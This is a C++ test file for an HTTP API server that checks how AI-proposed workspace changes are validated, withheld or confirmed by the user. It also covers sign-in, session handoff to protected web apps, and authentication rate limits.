               {"input", {{"customer_id", customer_id}, {"topic", "orders"}}},
               {"impact", "A stream named orders."}},
              {{"capability", "create_stream"},
               {"input", {{"customer_id", customer_id}, {"zetta", "bus"}, {"topic", "orders"}}},
               {"impact", "A stream named orders on the Lake bus."}},
              {{"capability", "create_stream"},
               {"input",
                {{"customer_id", customer_id}, {"zetta", "workspace"}, {"topic", "two words"}}},
               {"impact", "A stream named two words."}}})},
        {"reads", nlohmann::json::array()},
        {"delegations", nlohmann::json::array()}};
    const auto [sent_response, sent] =
        call("send_ask_message", {{"message", "Make a search index over my customers."}});
    ASSERT_TRUE(sent_response.starts_with("HTTP/1.1 200")) << sent_response;
    const std::string conversation = sent["value"]["conversation_id"];
    const std::string task = sent["value"]["task_id"];
    run_agent_task(*connection, task);
    const auto [settled_response, settled] = call(
        "settle_ask_turn", {{"conversation_id", conversation}, {"task_id", task}, {"kind", "ask"}});
    ASSERT_TRUE(settled_response.starts_with("HTTP/1.1 200")) << settled_response;

    const auto messages = conversation_messages(conversation);
    ASSERT_EQ(messages.size(), 2U) << messages.dump();
    const auto& reply = messages[1];
    const auto& offered = reply["payload"]["proposals"];
    ASSERT_EQ(offered.size(), 2U) << "only the proposals that can run are offered: "
                                  << reply.dump();
    EXPECT_EQ(offered[0]["capability"], "create_stream");
    EXPECT_EQ(offered[0]["input"]["zetta"], "bus");
    const auto& withheld = reply["payload"]["withheld_proposals"];
    ASSERT_EQ(withheld.size(), 2U) << reply.dump();
    EXPECT_EQ(withheld[0]["capability"], "create_index");
    EXPECT_EQ(withheld[0]["error"]["code"], "invalid_input");
    EXPECT_EQ(withheld[0]["error"]["path"], "/table");
    EXPECT_EQ(withheld[1]["capability"], "create_stream");
    EXPECT_EQ(withheld[1]["error"]["path"], "/zetta");
    const std::string content = reply["content"];
    EXPECT_TRUE(content.starts_with("I can do that.")) << content;
    EXPECT_NE(content.find("create_index needs `table` (the source table to index), which this "
                           "proposal does not name."),
              std::string::npos)
        << content;
    EXPECT_NE(content.find("create_stream needs `zetta`"), std::string::npos) << content;
    EXPECT_NE(content.find("Tell me what to use"), std::string::npos) << content;

    // The offered proposal is valid but refused when it runs (the Lake bus is browse-only): the
    // outcome is stored with ok false, so the page does not show it as Confirmed.
    const std::string message_id = reply["id"];
    const auto [refused_response, refused] =
        call("confirm_ask_proposal",
             {{"conversation_id", conversation},
              {"message_id", message_id},
              {"index", 0},
              {"input_sha256", reply["proposal_calls"][0]["input_sha256"]}});
    ASSERT_TRUE(refused_response.starts_with("HTTP/1.1 200")) << refused_response;
    EXPECT_EQ(refused["value"]["ok"], false) << refused_response;
    // The refusal fails the same way every time, so the person is told to ask again, the stored
    // outcome keeps its code, and Try again is not offered.
    const std::string again =
        " Ask Orama again with what to use and it will propose the change again.";
    EXPECT_EQ(refused["value"]["error"], "system streams are browse-only." + again);
    EXPECT_EQ(refused["value"]["code"], "unauthorized");
    EXPECT_EQ(refused["value"]["retry"], false);
    const auto after = conversation_messages(conversation);
    ASSERT_EQ(after.size(), 3U);
    EXPECT_EQ(after[2]["content"], "That did not work: system streams are browse-only." + again);
    EXPECT_EQ(after[2]["payload"]["ok"], false);
    EXPECT_EQ(after[2]["payload"]["confirmed"]["message_id"], message_id);
    EXPECT_EQ(after[2]["payload"]["error"]["code"], "unauthorized");
    EXPECT_EQ(after[2]["payload"]["retry"], false);

    // Input the capability itself refuses is said plainly, naming the field.
    const auto [topic_response, topic] =
        call("confirm_ask_proposal",
             {{"conversation_id", conversation},
              {"message_id", message_id},
              {"index", 1},
              {"input_sha256", reply["proposal_calls"][1]["input_sha256"]}});
    ASSERT_TRUE(topic_response.starts_with("HTTP/1.1 200")) << topic_response;
    EXPECT_EQ(topic["value"]["ok"], false);
    EXPECT_EQ(topic["value"]["error"],
              "`topic` is not valid for create_stream: a concrete topic name is required. Ask "
              "Orama again with what to use and it will propose the change again.");
    EXPECT_EQ(topic["value"]["code"], "invalid_input");
    EXPECT_EQ(topic["value"]["retry"], false);
    EXPECT_EQ(conversation_messages(conversation)[3]["payload"]["error"]["code"], "invalid_input");
}

// lake#794 review: proposals are the model's writing. One whose `capability` is null or a number,
// or whose input leaves out several required fields, is withheld with the reason; the reply and
// every proposal that can run are still stored, on the background path (settle_ask_turn) and on
// the at-once path (send_ask_message, an agent of the workspace that answers at once). A proposal
// that names neither `customer_id` nor `workspace_id` runs in the conversation's.
TEST_P(HttpResponseIsolation, AskOramaKeepsTheTurnWhenAProposalIsMalformed) {
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const std::string customer_id =
        nlohmann::json::parse(
            response_body(connection->request("GET", "/v1/list_customers", "", cookie)))
            .at("value")
            .at("items")
            .at(0)
            .at("id");
    select_workspace(*connection, customer_id);
    const std::string workspace_id = connection->workspace_id;
    const std::vector<std::pair<std::string, std::string>> same_origin{
        {"Origin", "http://localhost"}, {"Sec-Fetch-Site", "same-origin"}};
    const auto call = [&](const std::string& name, nlohmann::json input) {
        input["customer_id"] = customer_id;
        input["workspace_id"] = workspace_id;
        const std::string response = connection->request("POST",
                                                         "/v1/" + name,
                                                         input.dump(),
                                                         cookie,
                                                         "HTTP/1.1",
                                                         {},
                                                         "application/json",
                                                         same_origin);
        return std::pair{response, nlohmann::json::parse(response_body(response))};
    };
    const auto conversation_messages = [&](const std::string& conversation) {
        return nlohmann::json::parse(response_body(connection->request(
            "GET",
            "/v1/get_ask_conversation?customer_id=" + customer_id +
                "&workspace_id=" + workspace_id + "&conversation_id=" + conversation,
            "",
            cookie)))["value"]["messages"];
    };
    // `account` is the repository proposal's own customer_id: absent, or null as a model may
    // write it; lake fills it from the conversation either way.
    const auto proposals = [](const std::string& name,
                              std::optional<nlohmann::json> account = std::nullopt) {
        nlohmann::json repository{{"name", name}};
        if (account) {
            repository["customer_id"] = std::move(*account);
        }
        return nlohmann::json::array(
            {{{"capability", nullptr}, {"input", nlohmann::json::object()}},
             {{"capability", 7}, {"input", nlohmann::json::object()}},
             {{"capability", "create_stream"}, {"input", nlohmann::json::object()}},
             {{"capability", "create_repository"},
              {"input", std::move(repository)},
              {"impact", "A repository named " + name + "."}}});
    };
    // What both paths must store: the reply, the one proposal that can run, and the other three
    // withheld with what is wrong.
    const auto expect_turn = [&](const nlohmann::json& reply, const std::string& said) {
        const std::string content = reply["content"];
        EXPECT_TRUE(content.starts_with(said)) << content;
        const auto& offered = reply["payload"]["proposals"];
        ASSERT_EQ(offered.size(), 1U) << reply.dump();
        EXPECT_EQ(offered[0]["capability"], "create_repository");
        const auto& withheld = reply["payload"]["withheld_proposals"];
        ASSERT_EQ(withheld.size(), 3U) << reply.dump();
        EXPECT_TRUE(withheld[0]["capability"].is_null());
        EXPECT_EQ(withheld[0]["error"]["path"], "/capability");
        EXPECT_EQ(withheld[1]["capability"], 7);
        EXPECT_EQ(withheld[1]["error"]["path"], "/capability");
        EXPECT_EQ(withheld[2]["error"]["missing"], nlohmann::json::array({"zetta", "topic"}))
            << "every missing required field, not only the first";
        EXPECT_NE(content.find("a proposed change does not say which capability it runs."),
                  std::string::npos)
            << content;
        EXPECT_NE(content.find("create_stream needs `zetta`"), std::string::npos) << content;
        EXPECT_NE(content.find(" and `topic`"), std::string::npos) << content;
        EXPECT_NE(content.find(", which this proposal does not name."), std::string::npos)
            << content;
    };

    // Background: Ask Orama's answer settled from its task.
    agents_->answer = {{"ok", true},
                       {"reply", "I can do that."},
                       {"proposals", proposals("from-ask")},
                       {"reads", nlohmann::json::array()},
                       {"delegations", nlohmann::json::array()}};
    const auto [sent_response, sent] =
        call("send_ask_message", {{"message", "Make me a repository."}});
    ASSERT_TRUE(sent_response.starts_with("HTTP/1.1 200")) << sent_response;
    const std::string conversation = sent["value"]["conversation_id"];
    const std::string task = sent["value"]["task_id"];
    run_agent_task(*connection, task);
    const auto [settled_response, settled] = call(
        "settle_ask_turn", {{"conversation_id", conversation}, {"task_id", task}, {"kind", "ask"}});
    ASSERT_TRUE(settled_response.starts_with("HTTP/1.1 200")) << settled_response;
    EXPECT_EQ(settled["value"]["settled"], true);
    const auto messages = conversation_messages(conversation);
    ASSERT_EQ(messages.size(), 2U) << "the reply is stored: " << messages.dump();
    expect_turn(messages[1], "I can do that.");

    // Confirming the valid proposal fills customer_id and workspace_id from the conversation.
    const auto [confirmed_response, confirmed] =
        call("confirm_ask_proposal",
             {{"conversation_id", conversation},
              {"message_id", messages[1]["id"]},
              {"index", 0},
              {"input_sha256", messages[1]["proposal_calls"][0]["input_sha256"]}});
    ASSERT_TRUE(confirmed_response.starts_with("HTTP/1.1 200")) << confirmed_response;
    EXPECT_EQ(confirmed["value"]["ok"], true) << confirmed_response;
    const auto repositories = store_->list_repositories(customer_id, 10);
    ASSERT_TRUE(repositories);
    ASSERT_EQ(repositories->size(), 1U);
    EXPECT_EQ(repositories->front().name, "from-ask");
    EXPECT_EQ(repositories->front().workspace_id, workspace_id);

    // At once: an agent of the workspace answers in the request; send_ask_message stores it.
    workspace_caller_->answers["get_agent"] = {{"id", "space-agent"}, {"runtime", "native"}};
    workspace_caller_->answers["chat"] = {{"reply", "Here is what I would do."},
                                          {"proposals", proposals("from-space-agent", nullptr)},
                                          {"reads", nlohmann::json::array()},
                                          {"delegations", nlohmann::json::array()},
                                          {"trace_id", nullptr}};
    const auto [at_once_response, at_once] = call(
        "send_ask_message", {{"agent", "space-agent"}, {"message", "Make me a repository."}});
    ASSERT_TRUE(at_once_response.starts_with("HTTP/1.1 200")) << at_once_response;
    EXPECT_FALSE(at_once["value"].contains("task_id")) << at_once_response;
    ASSERT_TRUE(at_once["value"].contains("reply_id")) << at_once_response;
    const auto answered = conversation_messages(at_once["value"]["conversation_id"]);
    ASSERT_EQ(answered.size(), 2U) << answered.dump();
    EXPECT_EQ(answered[1]["id"], at_once["value"]["reply_id"]);
    expect_turn(answered[1], "Here is what I would do.");
    EXPECT_EQ(answered[1]["payload"]["trace_id"], "") << "a null trace id is no trace id";

    // A reply that is not text is no reply, never a lost turn.
    workspace_caller_->answers["chat"] = {{"reply", nullptr}, {"proposals", proposals("x")}};
    const auto [null_reply_response, null_reply] = call(
        "send_ask_message", {{"agent", "space-agent"}, {"message", "Anything?"}});
    ASSERT_TRUE(null_reply_response.starts_with("HTTP/1.1 200")) << null_reply_response;
    ASSERT_EQ(conversation_messages(null_reply["value"]["conversation_id"]).size(), 2U);
}

// lake#794 review: a confirm refused for a reason that may pass later with the same input (the
// workspace not reachable) keeps Try again; its stored outcome says so with the code.
TEST_P(HttpResponseIsolation, AskOramaOffersTryAgainOnlyForATransientRefusal) {
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const std::string customer_id =
        nlohmann::json::parse(
            response_body(connection->request("GET", "/v1/list_customers", "", cookie)))
            .at("value")
            .at("items")
            .at(0)
            .at("id");
    select_workspace(*connection, customer_id);
    const std::string workspace_id = connection->workspace_id;
    const std::vector<std::pair<std::string, std::string>> same_origin{
        {"Origin", "http://localhost"}, {"Sec-Fetch-Site", "same-origin"}};
    const auto call = [&](const std::string& name, nlohmann::json input) {
        input["customer_id"] = customer_id;
        input["workspace_id"] = workspace_id;
        const std::string response = connection->request("POST",
                                                         "/v1/" + name,
                                                         input.dump(),
                                                         cookie,
                                                         "HTTP/1.1",
                                                         {},
                                                         "application/json",
                                                         same_origin);
        return std::pair{response, nlohmann::json::parse(response_body(response))};
    };
    agents_->answer = {{"ok", true},
                       {"reply", "I can do that."},
                       {"proposals",
                        nlohmann::json::array({{{"capability", "create_stream"},
                                                {"input", {{"zetta", "workspace"}, {"topic", "orders"}}},
                                                {"impact", "A stream named orders."}}})}};
    const auto [sent_response, sent] = call("send_ask_message", {{"message", "Make a stream."}});
    ASSERT_TRUE(sent_response.starts_with("HTTP/1.1 200")) << sent_response;
    const std::string conversation = sent["value"]["conversation_id"];
    const std::string task = sent["value"]["task_id"];
    run_agent_task(*connection, task);
    ASSERT_TRUE(call("settle_ask_turn",
                     {{"conversation_id", conversation}, {"task_id", task}, {"kind", "ask"}})
                    .first.starts_with("HTTP/1.1 200"));
    const auto messages = nlohmann::json::parse(response_body(connection->request(
        "GET",
        "/v1/get_ask_conversation?customer_id=" + customer_id + "&workspace_id=" + workspace_id +
            "&conversation_id=" + conversation,
        "",
        cookie)))["value"]["messages"];
    ASSERT_EQ(messages.size(), 2U) << messages.dump();
    ASSERT_EQ(messages[1]["payload"]["proposals"].size(), 1U) << messages.dump();
    // The workspace stops answering only now, after the turn is stored (the agent bus uses it).
    workspace_caller_->topics.responder =
        [](const std::string& capability,
           const nlohmann::json&) -> std::optional<lake::control::ZettaControlResult<nlohmann::json>> {
        if (capability != "create_topic") {
            return std::nullopt;
        }
        return lake::control::ZettaControlResult<nlohmann::json>(std::unexpected(
            lake::control::ZettaControlError{"store_unavailable", "the workspace is not reachable"}));
    };
    const auto [refused_response, refused] =
        call("confirm_ask_proposal",
             {{"conversation_id", conversation},
              {"message_id", messages[1]["id"]},
              {"index", 0},
              {"input_sha256", messages[1]["proposal_calls"][0]["input_sha256"]}});
    ASSERT_TRUE(refused_response.starts_with("HTTP/1.1 200")) << refused_response;
    EXPECT_EQ(refused["value"]["ok"], false) << refused_response;
    EXPECT_EQ(refused["value"]["code"], "store_unavailable") << refused_response;
    EXPECT_EQ(refused["value"]["retry"], true) << refused_response;
    EXPECT_EQ(refused["value"]["error"].get<std::string>().find("Ask Orama again"),
              std::string::npos)
        << "a transient refusal is tried again, not asked again: " << refused_response;
}

TEST_P(HttpResponseIsolation, TheWebAppApprovesOnlyTheAgentFactoryProposalItWasShown) {
    auto* memory = dynamic_cast<lake::control::InMemoryStore*>(store_.get());
    if (memory == nullptr) {
        GTEST_SKIP() << "the operator's status is written directly only on the memory store";
    }
    auto connection = connect();
    const std::string cookie = sign_in(*connection);
    const std::string customer_id =
        nlohmann::json::parse(
            response_body(connection->request("GET", "/v1/list_customers", "", cookie)))
            .at("value")
            .at("items")
            .at(0)
            .at("id");
    select_workspace(*connection, customer_id);
    const std::string workspace_id = connection->workspace_id;
    const auto call = [&](const std::string& name, nlohmann::json input) {
        input["customer_id"] = customer_id;
        input["workspace_id"] = workspace_id;
        const std::string response = connection->request("POST",
                                                         "/v1/" + name,
                                                         input.dump(),
                                                         cookie,
                                                         "HTTP/1.1",
                                                         {},
                                                         "application/json",
                                                         {{"Origin", "http://localhost"}});
        return std::pair{response, nlohmann::json::parse(response_body(response))};
    };
    workspace_caller_->answers["create_agent"] = {{"id", "a-web"}, {"name", "Renewal watcher"}};
    // A float the browser would serialize differently (2.0 is "2" in JavaScript): the digest is
    // lake's, stored with the proposal, never recomputed by the page.
    const nlohmann::json proposal = {
        {"type", "native"},
        {"threshold", 2.0},
        {"agent", {{"name", "Renewal watcher"}, {"purpose", "Flag renewals at risk"}}}};
    agents_->answer = {
        {"ok", true},
        {"reply", "I propose an agent."},
        {"result",
         {{"kind", "proposal"}, {"proposal", proposal}, {"defects", nlohmann::json::array()}}}};
    const auto [sent_response, sent] =
        call("send_ask_message", {{"kind", "factory"}, {"message", "flag renewals"}});
    ASSERT_TRUE(sent_response.starts_with("HTTP/1.1 200")) << sent_response;
    const std::string conversation = sent["value"]["conversation_id"];
    const std::string task = sent["value"]["task_id"];
    const auto [refused_agent, refused] = call(
        "send_ask_message", {{"kind", "factory"}, {"agent", "agent-ask-orama"}, {"message", "x"}});
    EXPECT_TRUE(refused_agent.starts_with("HTTP/1.1 400")) << refused_agent;
    run_agent_task(*connection, task);
    EXPECT_EQ(agents_->turns.back()["message"], "flag renewals");
    const auto [settled_response, settled] =
        call("settle_ask_turn",
             {{"conversation_id", conversation}, {"task_id", task}, {"kind", "factory"}});
    ASSERT_TRUE(settled_response.starts_with("HTTP/1.1 200")) << settled_response;
    const auto messages = nlohmann::json::parse(response_body(connection->request(
        "GET",
        "/v1/get_ask_conversation?customer_id=" + customer_id + "&workspace_id=" + workspace_id +
            "&conversation_id=" + conversation,
        "",
        cookie)))["value"]["messages"];
    ASSERT_EQ(messages.size(), 2U);
    const nlohmann::json& answer = messages[1];
    EXPECT_EQ(answer["content"], "Here is the agent I propose. Review it below.");
    const std::string sha = answer["payload"].value("proposal_sha256", std::string());
    EXPECT_EQ(sha, lake::api::agent_proposal_digest(proposal));

    const nlohmann::json approve{{"conversation_id", conversation},
                                 {"message_id", answer["id"]},
                                 {"proposal_sha256", std::string(64, '0')}};
    const auto [stale_response, stale] = call("approve_agent_proposal", approve);
    EXPECT_TRUE(stale_response.starts_with("HTTP/1.1 409")) << stale_response;
    EXPECT_EQ(stale["error"]["message"], "The proposal changed since you saw it; review it again.");
    auto missing = approve;
    missing["message_id"] = messages[0]["id"];
    const auto [missing_response, missing_body] = call("approve_agent_proposal", missing);
    EXPECT_TRUE(missing_response.starts_with("HTTP/1.1 404")) << missing_response;
    EXPECT_FALSE(std::ranges::any_of(workspace_caller_->calls, [](const auto& c) {
        return std::get<0>(c) == "create_agent";
    })) << "nothing is created for another proposal";

    auto exact = approve;
    exact["proposal_sha256"] = sha;
    const auto [approved_response, approved] = call("approve_agent_proposal", exact);
    ASSERT_TRUE(approved_response.starts_with("HTTP/1.1 200")) << approved_response;
    EXPECT_EQ(approved["value"]["agent_id"], "a-web");
    EXPECT_EQ(approved["value"]["name"], "Renewal watcher");
    const auto after = nlohmann::json::parse(response_body(connection->request(
        "GET",
        "/v1/get_ask_conversation?customer_id=" + customer_id + "&workspace_id=" + workspace_id +
            "&conversation_id=" + conversation,
        "",
        cookie)))["value"]["messages"];
    ASSERT_EQ(after.size(), 3U);
    EXPECT_EQ(after[2]["content"], "Created Renewal watcher.");
}

// lake#561: who the web app is talking to, for a visitor and for a person.
TEST_P(HttpResponseIsolation, TheViewerSaysWhoIsSignedInAndWhereTheyAre) {
    auto connection = connect();
    const std::string visitor = connection->request("GET", "/v1/viewer");
    ASSERT_TRUE(visitor.starts_with("HTTP/1.1 200")) << visitor;
    const auto anonymous = nlohmann::json::parse(response_body(visitor))["value"];
    EXPECT_EQ(anonymous["signed_in"], false);
    EXPECT_EQ(anonymous["spaces"], nlohmann::json::array());
    EXPECT_FALSE(anonymous.contains("user_id"));
    EXPECT_EQ(anonymous["clerk"]["enabled"], false);
    EXPECT_EQ(anonymous["password_sign_up"], true);
    EXPECT_EQ(anonymous["external_origin"], "http://localhost");
    const std::string stale = connection->request("GET", "/v1/viewer", "", "lake_session=nope");
    EXPECT_TRUE(stale.starts_with("HTTP/1.1 200")) << "a dead cookie is a visitor, not a 401";

    const std::string cookie = sign_in(*connection);
    const std::string customer_id =
        nlohmann::json::parse(
            response_body(connection->request("GET", "/v1/list_customers", "", cookie)))
            .at("value")
            .at("items")
            .at(0)
            .at("id");
    select_workspace(*connection, customer_id);
    const std::string workspace_id = connection->workspace_id;
    const auto viewer = [&](const std::string& query) {
        const std::string response = connection->request("GET", "/v1/viewer" + query, "", cookie);
        EXPECT_TRUE(response.starts_with("HTTP/1.1 200")) << response;
        return nlohmann::json::parse(response_body(response))["value"];
    };
    const auto signed_in = viewer("");
    EXPECT_EQ(signed_in["signed_in"], true);
    EXPECT_EQ(signed_in["administrator"], false);
    EXPECT_EQ(signed_in["email"], email_);
    EXPECT_EQ(signed_in["display_name"], "Isolation test");
    EXPECT_EQ(signed_in["mfa_enrolled"], false);
    EXPECT_FALSE(signed_in["credential_kind"].get<std::string>().empty());
    EXPECT_FALSE(signed_in["session_id"].get<std::string>().empty());
    EXPECT_EQ(signed_in["customer_id"], customer_id);
    EXPECT_EQ(signed_in["workspace_id"], workspace_id) << "the space's only workspace";
    ASSERT_EQ(signed_in["spaces"].size(), 1U);
    EXPECT_EQ(signed_in["spaces"][0]["label"], "Your workspaces");
    EXPECT_EQ(signed_in["spaces"][0]["personal"], true);
    EXPECT_EQ(signed_in["spaces"][0]["workspaces"][0]["id"], workspace_id);
    EXPECT_FALSE(signed_in["config"]["frontier_model"].get<std::string>().empty());
    // A workspace the person cannot see is never the current one.
    const auto other =
        store_->create_user({"taap:viewer-other-" + lake::control::new_uuid_v4(), "", "Other"});
    ASSERT_TRUE(other);
    const auto other_space = store_->create_customer(
        {"individual", other->id, "", "viewer-other-" + lake::control::new_uuid_v4().substr(0, 8)});
    ASSERT_TRUE(other_space);
    const auto other_workspace = liquid::runtime::block_on(workspaces_->request(other_space->id));
    ASSERT_TRUE(other_workspace && *other_workspace);
    const auto elsewhere = viewer("?workspace_id=" + (*other_workspace)->workspace_id);
    EXPECT_EQ(elsewhere["customer_id"], customer_id);
    EXPECT_EQ(elsewhere["workspace_id"], workspace_id);
    const auto chosen = viewer("?workspace_id=" + workspace_id);
    EXPECT_EQ(chosen["workspace_id"], workspace_id);

    const std::string enrolled = connection->request("POST",
                                                     "/v1/enroll_mfa",
                                                     nlohmann::json{{"password", password_}}.dump(),
                                                     cookie,
                                                     "HTTP/1.1",
                                                     {},
                                                     "application/json");
    ASSERT_TRUE(enrolled.starts_with("HTTP/1.1 200")) << enrolled;
    EXPECT_EQ(viewer("")["mfa_enrolled"], true);

    const std::string operator_view =
        connection->request("GET", "/v1/viewer", "", "", "HTTP/1.1", "front-door-operator");
    const auto administrator = nlohmann::json::parse(response_body(operator_view))["value"];
    EXPECT_EQ(administrator["administrator"], true);
    EXPECT_FALSE(administrator.contains("user_id"));
}

// The operator sign-in form: a wrong token returns to /login with the reason, which the web app
// shows (lake#561); a right one sets the operator's Strict session cookie.
TEST_P(HttpResponseIsolation, OperatorSignInSaysWhyATokenWasRefused) {
    auto connection = connect();
    const std::string wrong = connection->request("POST", "/session", "token=nope");
    ASSERT_TRUE(wrong.starts_with("HTTP/1.1 302")) << wrong;
    EXPECT_EQ(response_header(wrong, "location"), "/login?error=That%20token%20did%20not%20match.");
    EXPECT_TRUE(response_header(wrong, "set-cookie").empty());
    const std::string right = connection->request("POST", "/session", "token=front-door-operator");
    ASSERT_TRUE(right.starts_with("HTTP/1.1 302")) << right;
    EXPECT_EQ(response_header(right, "location"), "/repositories");
    const std::string cookie = response_header(right, "set-cookie");
    EXPECT_TRUE(cookie.starts_with("lake_session=front-door-operator;")) << cookie;
    EXPECT_NE(cookie.find("SameSite=Strict"), std::string::npos);
    const auto viewer = get_v1(*connection, response_cookie_pair(right), "viewer");
    EXPECT_EQ(viewer["value"]["administrator"], true);
}

TEST_P(HttpResponseIsolation, ProtectedAppAuthorizationHandsOffAHostOnlySession) {
    const auto issued =
        store_->sign_in_password({"lake", email_, password_, "", "app-auth-fixture"});
    ASSERT_TRUE(issued) << issued.error().message;
    const auto principal = store_->context_for(issued->secret);
    ASSERT_TRUE(principal);

    const std::string suffix = lake::control::new_uuid_v4();
    std::string customer_name = "app-auth-" + suffix;
    std::erase(customer_name, '-');
    const auto organization =
        store_->create_organization({"taap:1:ed25519:app-auth-" + suffix, "App auth fixture", ""});
    ASSERT_TRUE(organization) << organization.error().message;
    const auto customer =
        store_->create_customer({"organization", "", organization->id, customer_name});
    ASSERT_TRUE(customer) << customer.error().message;
    const auto membership = store_->create_membership({organization->id,
                                                       "",
                                                       "user",
                                                       principal->user_id,
                                                       principal->taap_id,
                                                       "member",
                                                       "app-auth-attestation",
                                                       "app-auth-grantor",
                                                       "app-auth-request"});
    ASSERT_TRUE(membership) << membership.error().message;
    const auto workspace =
        store_->create_workspace({customer->id, "protected", "prod", principal->taap_id});
    ASSERT_TRUE(workspace) << workspace.error().message;

    lake::control::NewWebApp app_input;
    app_input.customer_id = customer->id;
    app_input.workspace_id = workspace->id;
    app_input.name = "protected";
    app_input.mode = "image";
    app_input.image = "registry.example.test/protected:latest";
    app_input.port = 8080;
    app_input.host = "protected-" + customer_name + ".apps.example.test";
    app_input.auth = "lake";
    const auto app = store_->create_web_app(app_input);
    ASSERT_TRUE(app) << app.error().message;
    app_input.name = "other";
    app_input.host = "other-" + customer_name + ".apps.example.test";
    const auto other_app = store_->create_web_app(app_input);
    ASSERT_TRUE(other_app) << other_app.error().message;

    const std::string auth_path = "/w/" + workspace->id + "/v1/apps/auth";
    // Exactly what ingress-nginx's auth subrequest sends: Host is Lake's Service, there is no
    // X-Forwarded-Host, and X-Original-URL is absolute ($scheme://$http_host$request_uri).
    const auto app_headers = [&](const std::string& host, const std::string& original_url) {
        const std::string absolute =
            original_url.starts_with("http") ? original_url : "http://" + host + original_url;
        return std::vector<std::pair<std::string, std::string>>{
            {"X-Original-Method", "GET"},
            {"X-Original-URL", absolute},
        };
    };
    HttpConnection connection(server_->port());
    const std::string missing = connection.request(
        "GET", auth_path, {}, {}, "HTTP/1.1", {}, {}, app_headers(app->host, "/"));
    ASSERT_TRUE(missing.starts_with("HTTP/1.1 401")) << missing;

    const std::string redirect_url = "https://" + app->host + "/dashboard?view=recent";
    const std::string authorize = "/apps/authorize?app=" + lake::api::oauth_url_encode(app->id) +
                                  "&rd=" + lake::api::oauth_url_encode(redirect_url);
    const std::string signed_out = connection.request("GET", authorize);
    ASSERT_TRUE(signed_out.starts_with("HTTP/1.1 302")) << signed_out;
    EXPECT_TRUE(response_header(signed_out, "location").starts_with("/sign-in?return_to="));
    const std::string return_cookie = response_cookie_pair(signed_out);
    EXPECT_TRUE(return_cookie.starts_with("lake_sign_in_return="));

    // The web app signs in through the API, then returns to the app's authorization from the URL.
    const std::string signed_in = connection.request(
        "POST",
        "/v1/sign_in_password",
        nlohmann::json{{"email", email_}, {"password", password_}, {"device_name", "app-auth"}}
            .dump(),
        return_cookie,
        "HTTP/1.1",
        {},
        "application/json");
    ASSERT_TRUE(signed_in.starts_with("HTTP/1.1 200")) << signed_in;
    const std::string lake_cookie = response_cookie_pair(signed_in);
    ASSERT_TRUE(lake_cookie.starts_with("lake_session="));

    const std::string wrong_redirect =
        connection.request("GET",
                           "/apps/authorize?app=" + lake::api::oauth_url_encode(app->id) +
                               "&rd=https%3A%2F%2Fevil.example.test%2F",
                           {},
                           lake_cookie);
    ASSERT_TRUE(wrong_redirect.starts_with("HTTP/1.1 400")) << wrong_redirect;

    const std::string authorized =
        connection.request("GET", authorize, {}, return_cookie + "; " + lake_cookie);
    ASSERT_TRUE(authorized.starts_with("HTTP/1.1 302")) << authorized;
    const std::string handoff = response_header(authorized, "location");
    const auto handoff_url = boost::urls::parse_uri(handoff);
    ASSERT_TRUE(handoff_url) << handoff;
    std::string code;
    for (const auto& parameter : handoff_url->params()) {
        if (parameter.key == "__lake_code") {
            code = std::string(parameter.value);
        }
    }
    ASSERT_FALSE(code.empty());
    EXPECT_EQ(handoff_url->host(), app->host);

    const std::string exchanged =
        connection.request("GET",
                           auth_path,
                           {},
                           {},
                           "HTTP/1.1",
                           {},
                           {},
                           app_headers(app->host, "/dashboard?view=recent&__lake_code=" + code));
    ASSERT_TRUE(exchanged.starts_with("HTTP/1.1 200")) << exchanged;
    EXPECT_EQ(response_header(exchanged, "x-orama-user"), principal->user_id);
    EXPECT_EQ(response_header(exchanged, "x-orama-space"), workspace->id);
    const std::string app_cookie_header = response_header(exchanged, "set-cookie");
    EXPECT_TRUE(app_cookie_header.starts_with("lake_app_session="));
    EXPECT_NE(app_cookie_header.find("; Path=/; Secure; HttpOnly; SameSite=Lax"),
              std::string::npos);
    EXPECT_EQ(app_cookie_header.find("Domain="), std::string::npos);
    const std::string app_cookie = response_cookie_pair(exchanged);

    const std::string reused =
        connection.request("GET",
                           auth_path,
                           {},
                           {},
                           "HTTP/1.1",
                           {},
                           {},
                           app_headers(app->host, "/dashboard?__lake_code=" + code));
    EXPECT_TRUE(reused.starts_with("HTTP/1.1 401")) << reused;

    const std::string wrong_app = connection.request(
        "GET", auth_path, {}, app_cookie, "HTTP/1.1", {}, {}, app_headers(other_app->host, "/"));
    EXPECT_TRUE(wrong_app.starts_with("HTTP/1.1 401")) << wrong_app;

    const auto now = std::chrono::duration_cast<std::chrono::seconds>(
                         std::chrono::system_clock::now().time_since_epoch())
                         .count();
    const auto expired_token = lake::control::issue_web_app_session(
        instance_kek_, app->id, principal->user_id, workspace->id, now - 12 * 60 * 60);
    ASSERT_TRUE(expired_token) << expired_token.error();
    const std::string expired = connection.request("GET",
                                                   auth_path,
                                                   {},
                                                   "lake_app_session=" + *expired_token,
                                                   "HTTP/1.1",
                                                   {},
                                                   {},
                                                   app_headers(app->host, "/"));
    EXPECT_TRUE(expired.starts_with("HTTP/1.1 401")) << expired;

    ASSERT_TRUE(store_->remove_member(membership->id, "app-auth-grantor"));
    const std::string removed = connection.request(
        "GET", auth_path, {}, app_cookie, "HTTP/1.1", {}, {}, app_headers(app->host, "/"));
    EXPECT_TRUE(removed.starts_with("HTTP/1.1 401")) << removed;
}

INSTANTIATE_TEST_SUITE_P(HttpServer,
                         HttpResponseIsolation,
                         testing::Combine(testing::Bool(), testing::Bool()),
                         [](const testing::TestParamInfo<HttpResponseIsolation::ParamType>& info) {
                             return std::string(std::get<0>(info.param) ? "Postgres" : "Memory") +
                                    (std::get<1>(info.param) ? "FreshConnection"
                                                             : "ReusedConnection");
                         });

TEST(HttpServer, AuthenticationClientBudgetFollowsTheIngressAddressAcrossRestAndMcp) {
    auto store = std::make_shared<lake::control::InMemoryStore>();
    lake::api::ApiServer server({.port = 0, .store = store});
    ASSERT_TRUE(server.start()) << server.reason();
    // Every request comes from the same socket peer, as it would through one ingress pod.
    int attempt = 0;
    auto authenticate = [&](std::vector<std::pair<std::string, std::string>> headers) {
        HttpConnection connection(server.port());
        const nlohmann::json arguments{{"email", std::to_string(attempt) + "@example.test"},
                                       {"code", "wrong"}};
        const bool mcp = attempt++ % 2 != 0;
        const auto payload =
            mcp ? nlohmann::json{{"jsonrpc", "2.0"},
                                 {"id", attempt},
                                 {"method", "tools/call"},
                                 {"params",
                                  {{"name", "recover_with_code"}, {"arguments", arguments}}}}
                : arguments;
        const auto response = connection.request("POST",
